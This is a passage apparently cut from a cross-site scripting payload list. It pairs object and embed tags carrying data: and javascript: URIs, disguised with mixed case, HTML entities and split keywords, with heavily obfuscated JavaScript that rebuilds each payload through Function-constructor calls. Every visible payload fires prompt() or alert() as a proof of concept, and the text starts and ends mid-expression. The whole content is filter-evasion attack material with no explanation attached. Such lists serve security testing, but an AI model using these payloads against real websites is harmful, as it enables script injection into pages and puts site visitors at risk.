String.fromCharCode(59)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="data:text/html, <script>prompt(259)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+(false+[0]+"")[7]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+([][""]+"")[2]+(false+"")[1]+(false+"")[3]+(true+"")[3]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(+(101))["to"+String["name"]]()[1]+(undefined+"")[1]+([][""]+"")[3]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+([][""]+"")[4]+([][""]+"")[4]+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+(101))["to"+String["name"]]()[1]+([][""]+"")[2]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+([][""]+"")[4]+([false]+"")[3]+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+[]["constructor"]["constructor"]("return String.fromCharCode(107)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(119)")()+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+([false]+"")[3]+(+!+[]+!+[]+[])[0]+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(121)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+([][""]+"")[2]+(+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(false+[0]+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="DaTa:text/html,<script>prompt(263)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="data&colon;text/html,<script>prompt(265)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(undefined+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="data&#x003A;text/html,<script>prompt(267)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<embed code="&#x64;&#x61;ta:text/html,<script>prompt(269)</script>">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+([][""]+"")[2]+(true+"")[3]+([][""]+"")[4]+(false+[0]+"")[7]+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[4]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+(true+"")[0]+(true+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(+(101))["to"+String["name"]]()[1]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(44)")()+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(47)")()+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="JaVaScRiPt:prompt(271)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript&color;prompt(273)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+([false]+"")[3]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(false+"")[2]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="java
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]
script:prompt(277)">
(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript&#x003A;prompt(279)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+[]+[])[0]+(+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="javascript&#58;prompt(281)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+([][""]+"")[3]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object data="&#x6A;avascript:prompt(283)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(118)")()+(false+"")[1]+(false+"")[3]+([false]+"")[3]+(true+"")[1]+([false]+"")[10]+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(58)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+[]["constructor"]["constructor"]("return String.fromCharCode(109)")()+[]["constructor"]["constructor"]("return String.fromCharCode(112)")()+(true+"")[0]+([false]+"")[11]+(+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+[])[0]+([false]+"")[12]+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(62)")()
<object\n data="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;prompt(285)">
[]["constructor"]["constructor"]("return String.fromCharCode(60)")()+[]["constructor"]["constructor"]("return String.fromCharCode(111)")()+([][""]+"")[2]+([][""]+"")[3]+(true+"")[3]+([false]+"")[3]+(true+"")[0]+[]["constructor"]["constructor"]("return String.fromCharCode(92)")()+(undefined+"")[1]+(false+[0]+"")[7]+([][""]+"")[4]+(false+"")[1]+(true+"")[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(61)")()+[]["constructor"]["constructor"]("return String.fromCharCode(34)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(false+"")[1]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return String.fromCharCode(120)")()+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+(+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+[])[0]+[]["constructor"]["constructor"]("return String.fromCharCode(59)")()+[]["constructor"]["constructor"]("return String.fromCharCode(38)")()+[]["constructor"]["constructor"]("return String.fromCharCode(35)")()+[]["constructor"]["constructor"]("return 